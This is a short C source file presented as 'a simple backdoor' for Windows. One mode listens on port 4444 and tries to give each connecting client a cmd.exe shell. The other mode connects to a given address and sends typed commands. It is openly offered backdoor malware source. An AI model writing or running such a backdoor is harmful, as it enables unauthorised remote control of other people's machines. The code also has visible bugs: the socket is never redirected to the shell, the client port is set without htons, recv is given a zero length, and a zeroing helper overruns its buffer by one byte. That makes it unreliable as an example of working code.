/*
 ****************************************************************
 * A simple backdoor for Windoze...                             *
 ****************************************************************
 */

#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>

#include <windows.h>
#include <winsock2.h>

#define MY_PORT 4444
#define PROGRAM_NAME "C:\\Windows\\system32\\cmd.exe"

#define TERMINATE(A, T, M) ({\
	if((T)) {\
		if(A == 0) fprintf(stderr, "[LINE:%d] [FILE:%s] : ERROR: %s\n", __LINE__, __FILE__, M);\
		else if(A == 1) fprintf(stderr, "[LINE:%d] [FILE:%s] : WARNING: %s\n", __LINE__, __FILE__, M);\
		else fprintf(stdout, "%s\n", M);\
		errno = 0;\
		goto error;\
	}\
})

enum _TERMINATE {
	TERMINATE_ERROR,
	TERMINATE_WARNING,
	TERMINATE_NORMAL
};

void
pzero(p, s)
char *p;
size_t s;
{
	size_t i;
	for(i=0; i<s+1; ++i)
		*(p+i)=0;
}

#define MAXBUF 1024

int
main(argc, argv)
int argc;
char **argv;
{
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in self;

	sockfd = 0;
	WSAStartup(MAKEWORD(2, 0), &wsaData);

	if(argc < 2) {
	    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));

		/* Setup socket address struct */
		pzero(&self, sizeof(self));
		self.sin_family = AF_INET;
		self.sin_port = htons(MY_PORT);
		self.sin_addr.s_addr = INADDR_ANY;

		/* bind port to socket */
		TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
		/* listen for connections */
		TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));

		for(;;) {
			int clientfd;
			struct sockaddr_in client;
			int clientlen = sizeof(client);
			char message[256];

			/* accept connection */
			clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
			if(clientfd>0) {
				pzero(message, sizeof(message));
				sprintf(message, "%s:%u client connected.", inet_ntoa(client.sin_addr),
					client.sin_port);
				puts(message);
				dup(0);
				dup(1);
				dup(2);
				execlpe(PROGRAM_NAME, NULL, NULL);
				if(closesocket(clientfd)==0) {
					pzero(message, sizeof(message));
					sprintf(message, "%s:%u client disconnected.", inet_ntoa(client.sin_addr),
						client.sin_port);
					puts(message);
					close(0);
					close(1);
					close(2);
				}
			}
		}

		closesocket(sockfd);
	} else if(argc == 2) {
		char buf[MAXBUF];
		int bytes;
		TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));

		pzero(buf, sizeof(buf)/sizeof(char));
		pzero(&self, sizeof(self));
		self.sin_family = AF_INET;
		self.sin_port = MY_PORT;
		self.sin_addr.s_addr = inet_addr(argv[1]);

        TERMINATE(0, connect(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));

        while(1) {
        	char reply[2000];
        	bytes=0;
        	pzero(reply, sizeof(reply)/sizeof(char));
        	if((bytes=recv(sockfd, reply, bytes, 0)) < 0) {
        		puts("Error: couldn't receive data.");
			}
			scanf("%[^\n]", buf);
			if((bytes=send(sockfd, buf, MAXBUF, 0)) < 0)
				puts("Error: sending data.");
        	pzero(buf, sizeof(buf)/sizeof(char));
        }
        closesocket(sockfd);
	} else {
		fprintf(stderr, "Usage: Backdoor.exe [Address]\n");
	}

	WSACleanup();
	return 0;

error:
	if(sockfd != 0) closesocket(sockfd);
	WSACleanup();
	return 1;
}
